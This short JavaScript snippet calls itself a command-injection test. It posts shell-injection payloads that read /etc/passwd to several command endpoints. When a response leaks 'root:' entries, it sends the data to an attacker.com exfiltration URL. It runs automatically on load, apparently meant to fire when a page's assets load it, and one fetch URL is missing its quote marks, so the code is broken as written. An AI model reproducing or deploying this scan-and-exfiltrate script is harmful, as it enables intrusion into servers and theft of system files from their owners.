// Test for command injection endpoints
async function testCmdInjection() {
  const endpoints = [
    '/api/runCommand',
    '/admin/exec',
    '/v1/system'
  ];
  
  const testPayloads = [
    ';cat /etc/passwd',
    'cat /etc/passwd',
    '$(cat /etc/passwd)',
    '|cat /etc/passwd',
    '||cat /etc/passwd',
    '&&cat /etc/passwd'
  ];
  
  for (const endpoint of endpoints) {
    for (const payload of testPayloads) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ input: payload })
        });
        
        if(response.ok) {
          const data = await response.text();
          if(data.includes('root:')) {
            await fetch(https://attacker.com/exfil?endpoint=${endpoint}&data=${encodeURIComponent(data)});
          }
        }
      } catch(e) { continue; }
    }
  }
}

// Execute when CSS loads this JS
testCmdInjection();
